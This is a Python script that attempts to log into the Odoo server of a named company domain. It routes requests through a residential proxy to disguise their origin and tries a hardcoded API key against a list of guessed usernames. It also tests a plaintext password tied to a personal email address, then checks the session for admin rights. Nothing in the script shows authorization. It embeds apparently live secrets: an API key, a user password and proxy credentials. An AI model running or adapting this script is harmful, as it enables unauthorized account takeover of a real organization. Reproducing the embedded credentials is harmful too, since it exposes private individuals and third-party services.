"""Test Odoo API key on unii.com.mx via Bright Data proxy"""
import requests, json, sys, re, urllib3
urllib3.disable_warnings()

BASE   = "https://unii.com.mx"
DB     = "unii"
APIKEY = "9242f55eec6e9ffcb167ca16751f797a204eb604"
TO     = 25

PROXY  = "http://brd-customer-hl_25b43d3c-zone-residential_mx1-country-mx:erjvs0sv8cvs@brd.superproxy.io:22225"
PX     = {"http": PROXY, "https": PROXY}

USERS = [
    "luishmatag1@gmail.com",
    "admin",
    "administrator",
    "admin@unii.com.mx",
    "admin@unimex.com.mx",
    "sgarcia",
    "sergio.garcia@unimex.com.mx",
    "soporte@unimex.com.mx",
    "vortem",
    "root",
    "sistema",
]

def rpc(service, method, args):
    r = requests.post(f"{BASE}/jsonrpc", json={
        "jsonrpc": "2.0", "id": 1,
        "method": "call",
        "params": {"service": service, "method": method, "args": args}
    }, timeout=TO, verify=False, proxies=PX)
    return r.json()

print(f"[*] Testing Odoo API key auth on {BASE}")
print(f"[*] DB: {DB}")
print(f"[*] Key: {APIKEY[:12]}...{APIKEY[-8:]}")

# Check proxy IP
try:
    r = requests.get("https://httpbin.org/ip", proxies=PX, verify=False, timeout=15)
    print(f"[*] Exit IP: {r.json().get('origin', '?')}")
except:
    print("[!] Could not verify proxy IP")

# Test version first to confirm Odoo is alive
print("\n[0] Odoo version check...")
try:
    v = rpc("common", "version", [])
    ver = v.get("result", {}).get("server_version", "?") if "result" in v else str(v)[:200]
    print(f"    Version: {ver}")
except Exception as e:
    print(f"    [!] {e}")
    sys.exit(1)

# JSON-RPC auth with API key
print(f"\n{'='*60}")
print(f"[1] JSON-RPC common.login with API key")
print(f"{'='*60}")

for user in USERS:
    try:
        r = rpc("common", "login", [DB, user, APIKEY])
        uid = r.get("result")
        err = r.get("error")
        if uid and uid is not False and uid != 0:
            print(f"  [!!!] HIT >>> {user} → UID={uid} <<<")
        elif err:
            emsg = err.get("data", {}).get("message", str(err))[:120]
            print(f"  [err] {user} → {emsg}")
        else:
            print(f"  [---] {user} → {uid}")
    except Exception as e:
        print(f"  [exc] {user} → {e}")

# Also verify known cred still works
print(f"\n{'='*60}")
print(f"[2] Known cred luishmatag1 (original password)")
print(f"{'='*60}")
try:
    r = rpc("common", "login", [DB, "luishmatag1@gmail.com", "Gallito3690"])
    uid = r.get("result")
    print(f"  luishmatag1 → UID={uid}")
except Exception as e:
    print(f"  [exc] {e}")

# Web login test with API key
print(f"\n{'='*60}")
print(f"[3] Web /web/login with API key (luishmatag1)")
print(f"{'='*60}")
try:
    sess = requests.Session()
    sess.verify = False
    r = sess.get(f"{BASE}/web/login", timeout=TO, proxies=PX)
    m = re.search(r'name="csrf_token"\s+value="([^"]+)"', r.text)
    csrf = m.group(1) if m else ""
    r = sess.post(f"{BASE}/web/login",
                  data={"login": "luishmatag1@gmail.com", "password": APIKEY,
                        "csrf_token": csrf, "db": DB, "redirect": "/"},
                  timeout=TO, allow_redirects=False, proxies=PX)
    sid = sess.cookies.get("session_id")
    loc = r.headers.get("Location", "")
    st = r.status_code
    if st in (301, 302, 303) and "/web" in loc:
        print(f"  [!!!] LOGIN OK → redirect {loc}, sid={sid[:20] if sid else 'none'}...")
        
        # If login works, enumerate what we can see
        print("\n  [+] Enumerating access...")
        
        # User info
        ri = sess.post(f"{BASE}/web/session/get_session_info", json={
            "jsonrpc": "2.0", "id": 2, "params": {}
        }, timeout=TO, verify=False, proxies=PX)
        info = ri.json().get("result", {})
        print(f"  [+] User: {info.get('username')}, UID: {info.get('uid')}")
        print(f"  [+] Company: {info.get('company_id')}")
        print(f"  [+] Is admin: {info.get('is_admin')}")
        print(f"  [+] Is system: {info.get('is_system')}")
        
    elif "Wrong login" in r.text or "Inicio de sesión incorrecto" in r.text:
        print(f"  [---] Wrong login/password")
    else:
        print(f"  [???] status={st}, loc={loc[:100]}")
except Exception as e:
    print(f"  [exc] {e}")

print("\n[*] Done")
